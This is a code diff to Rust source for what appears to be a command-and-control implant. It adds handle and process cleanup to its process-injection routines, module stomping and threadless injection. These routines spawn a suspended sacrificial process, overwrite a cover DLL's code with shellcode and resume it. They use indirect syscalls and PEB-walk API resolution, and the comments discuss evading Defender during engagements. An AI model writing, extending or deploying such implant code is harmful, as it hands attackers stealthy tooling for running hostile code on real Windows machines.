@@ -65,14 +65,79 @@ pub fn modulestomp_enabled() -> bool {
     MODULESTOMP_ENABLED.load(Ordering::Acquire)
 }
 
-/// A sacrificial process created suspended, ready for stomping. The handle is
-/// held by the caller; `pid` is for diagnostics. Dropping this does NOT close
-/// the handle — the caller must CloseHandle it (or leak it for the process
-/// lifetime, as CS-style injects do).
+/// A sacrificial process created suspended, ready for stomping. `handle` +
+/// `main_thread` are the PROCESS_INFORMATION handles; `pid` is diagnostics.
+///
+/// **Drop-guarded (zero-leftover contract):** this struct OWNS both handles
+/// and, unless the process was explicitly resumed, the process itself. On drop
+/// it terminates a never-resumed sacrificial (so no suspended zombie lingers)
+/// and closes BOTH handles. A process whose main thread was resumed (shellcode
+/// executing) is NOT terminated — only its handles are closed fire-and-forget.
+/// Every path that creates a sacrificial therefore cleans up after itself:
+/// there is no way to leak a handle or a suspended process.
 pub struct SacrificialProcess {
     pub handle: *mut c_void,
     pub main_thread: *mut c_void,
     pub pid: u32,
+    /// Set once the sacrificial's main thread has been resumed (shellcode is
+    /// executing in the target). Drop then closes the handles WITHOUT
+    /// terminating the live process.
+    resumed: bool,
+}
+
+impl SacrificialProcess {
+    /// Mark the sacrificial as resumed (its main thread is executing the
+    /// injected shellcode). Drop then closes the handles fire-and-forget
+    /// instead of terminating the live target.
+    pub fn mark_resumed(&mut self) {
+        self.resumed = true;
+    }
+}
+
+impl Drop for SacrificialProcess {
+    fn drop(&mut self) {
+        // SAFETY: single-threaded beacon context; best-effort cleanup. The
+        // crate builds with panic=abort, so Drop never runs during unwinding,
+        // and nothing here allocates — this cannot fault.
+        unsafe {
+            if !self.resumed && !self.handle.is_null() {
+                // A never-resumed sacrificial must not stay suspended forever
+                // (a disarmed or failed stomp would otherwise leave a frozen
+                // notepad.exe in the process list). Terminate it first.
+                if let Some(addr) =
+                    crate::resolve::export_addr(b"kernel32.dll", b"TerminateProcess")
+                {
+                    type TerminateProcess = unsafe extern "system" fn(*mut c_void, u32) -> i32;
+                    let terminate: TerminateProcess = core::mem::transmute(addr);
+                    let _ = terminate(self.handle, 1);
+                }
+            }
+            // Close both handles: prefer the indirect-syscall NtClose (the
+            // implant's standard path) when the runtime is live, else the
+            // PEB-walked kernel32 CloseHandle.
+            if let Some(rt) = crate::syscalls::global() {
+                if !self.handle.is_null() {
+                    let _ = crate::syscalls::nt_close(rt, self.handle as usize);
+                }
+                if !self.main_thread.is_null() {
+                    let _ = crate::syscalls::nt_close(rt, self.main_thread as usize);
+                }
+            } else if let Some(addr) =
+                crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle")
+            {
+                type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
+                let close: CloseHandle = core::mem::transmute(addr);
+                if !self.handle.is_null() {
+                    let _ = close(self.handle);
+                }
+                if !self.main_thread.is_null() {
+                    let _ = close(self.main_thread);
+                }
+            }
+        }
+        self.handle = core::ptr::null_mut();
+        self.main_thread = core::ptr::null_mut();
+    }
 }
 
 /// Create the sacrificial process `spawn_to` (e.g. "notepad.exe") in a
@@ -82,7 +147,8 @@ pub struct SacrificialProcess {
 ///
 /// # Safety
 /// Uses Win32 CreateProcessW via PEB-walk resolution. Single-threaded beacon
-/// context. The returned handles are raw and must be closed by the caller.
+/// context. The returned struct owns both handles: dropping it closes them
+/// (and terminates a never-resumed process).
 pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &'static str> {
     type CreateProcessW = unsafe extern "system" fn(
         *const u16,  // lpApplicationName
@@ -143,6 +209,7 @@ pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &
         handle: h_process,
         main_thread: h_thread,
         pid,
+        resumed: false,
     })
 }
 
@@ -150,34 +217,50 @@ pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &
 /// process suspended, (when armed) loads a cover DLL + overwrites its .text
 /// with `shellcode`, then (when armed) resumes the main thread to execute it.
 ///
-/// **With [`modulestomp_enabled`] OFF (default)**: only creates the sacrificial
-/// process (verifiable data path) and returns the handle WITHOUT stomping or
-/// resuming — so the beacon never trips protection on an unvalidated inject.
-/// The handle is returned so an operator/selftest can inspect/terminate it.
+/// **With [`modulestomp_enabled`] OFF**: only creates the sacrificial process
+/// (verifiable data path) and returns it WITHOUT stomping or resuming — so the
+/// beacon never trips protection on an unvalidated inject. The returned
+/// [`SacrificialProcess`] is Drop-guarded: the caller may inspect it (handle +
+/// pid) while it lives, and dropping it terminates the suspended process +
+/// closes both handles.
 ///
-/// **With [`modulestomp_enabled`] ON**: performs the full stomp + resume. This
-/// is the part that needs target-side validation (Defender will catch a naive
-/// WriteProcessMemory on a cover DLL's .text; the real engagement uses a
-/// threadless-inject or HWBP variant instead — out of scope for this module).
+/// **With [`modulestomp_enabled`] ON**: performs the full stomp + resume. On
+/// success the target runs the shellcode and the guard only closes the handles
+/// (fire-and-forget); on ANY failure — including a resume failure after the
+/// .text was already overwritten — the guard terminates the sacrificial and
+/// closes both handles. module_stomp owns cleanup on every non-success path:
+/// no path leaks a handle or leaves a suspended zombie.
 ///
 /// # Safety
 /// Cross-process handle + memory operations. Single-threaded beacon context.
-pub unsafe fn module_stomp(spawn_to: &str, shellcode: &[u8]) -> Result<usize, &'static str> {
+pub unsafe fn module_stomp(
+    spawn_to: &str,
+    shellcode: &[u8],
+) -> Result<SacrificialProcess, &'static str> {
     let proc = unsafe { create_sacrificial(spawn_to)? };
     if !modulestomp_enabled() {
-        // Disarmed: return the handle without stomping. The sacrificial process
-        // is left suspended — a selftest can inspect it, then TerminateProcess.
-        return Ok(proc.handle as usize);
+        // Disarmed: return the still-suspended process in its Drop-guarded
+        // struct. No stomp, no resume — the process stays suspended for the
+        // caller to inspect; when it drops, the guard terminates it + closes
+        // both handles.
+        return Ok(proc);
     }
     // ---- ARMED PATH (gated) ------------------------------------------------
-    let res = stomp_and_resume(&proc, shellcode);
-    if let Some(rt) = crate::syscalls::global() {
-        unsafe {
-            crate::syscalls::nt_close(rt, proc.handle as usize);
-            crate::syscalls::nt_close(rt, proc.main_thread as usize);
+    match unsafe { stomp_and_resume(&proc, shellcode) } {
+        Ok(()) => {
+            // Shellcode is executing in the target. Mark the process resumed
+            // so the Drop guard closes the handles fire-and-forget WITHOUT
+            // terminating the live process.
+            let mut proc = proc;
+            proc.mark_resumed();
+            Ok(proc)
+        }
+        Err(e) => {
+            // Non-success path: `proc` drops here; the guard terminates the
+            // (suspended or half-stomped) target and closes both handles.
+            Err(e)
         }
     }
-    res.map(|_| 0)
 }
 
 /// The cover-DLL stomp: load a cover DLL in the target via
@@ -228,7 +311,10 @@ unsafe fn stomp_and_resume(
         return Err("VirtualProtectEx RWX→RX restore failed");
     }
     // Step 6: ResumeThread — the shellcode now runs from the cover DLL's .text.
-    let _ = unsafe { resume_thread(proc.main_thread) };
+    //    Propagate failure: if ResumeThread fails the target stays suspended
+    //    with already-overwritten .text — that is a non-success path and
+    //    module_stomp's cleanup (terminate + close both handles) must own it.
+    unsafe { resume_thread(proc.main_thread) }?;
     Ok(())
 }
 
@@ -948,11 +1034,15 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
                 spawn_to
             };
             match unsafe { create_sacrificial(target) } {
-                Ok(proc) => {
+                Ok(mut proc) => {
                     let res = match unsafe {
                         threadless_inject(proc.handle, proc.main_thread, shellcode)
                     } {
                         Ok(()) => {
+                            // The sacrificial's main thread is now executing
+                            // the shellcode — the Drop guard must NOT terminate
+                            // it (it only closes the handles on drop).
+                            proc.mark_resumed();
                             let mut msg =
                                 crate::heap::String::from("threadless inject ok (sacrificial pid=");
                             let mut buf = [0u8; 10];
@@ -976,25 +1066,34 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
                         }
                         Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
                     };
-                    if let Some(rt) = crate::syscalls::global() {
-                        unsafe {
-                            crate::syscalls::nt_close(rt, proc.handle as usize);
-                            crate::syscalls::nt_close(rt, proc.main_thread as usize);
-                        }
-                    }
+                    // The Drop guard on `proc` owns cleanup: on success it
+                    // closes the handles fire-and-forget; on failure it
+                    // terminates the suspended sacrificial + closes both
+                    // handles — no path leaks.
                     res
                 }
                 Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
             }
         }
         2 => {
+            if !modulestomp_enabled() {
+                // Disarmed: creating a sacrificial just to terminate it is
+                // wasteful and noisy — fail fast with a clear error instead.
+                let mut msg = warn_prefix;
+                msg.push_str("module stomp disabled (gate off)");
+                return nyx_protocol::Response::Err(crate::heap::String::from(msg));
+            }
             let target = if spawn_to.is_empty() {
                 "notepad.exe"
             } else {
                 spawn_to
             };
             match unsafe { module_stomp(target, shellcode) } {
-                Ok(_handle) => {
+                Ok(_proc) => {
+                    // `_proc` (the Drop-guarded SacrificialProcess) drops at
+                    // the end of this arm: armed-success → close-only (target
+                    // is running the shellcode); disarmed → terminate the
+                    // suspended sacrificial + close both handles.
                     let mut msg = warn_prefix;
                     msg.push_str("module stomp inject ok");
                     nyx_protocol::Response::Output(msg.into_bytes())
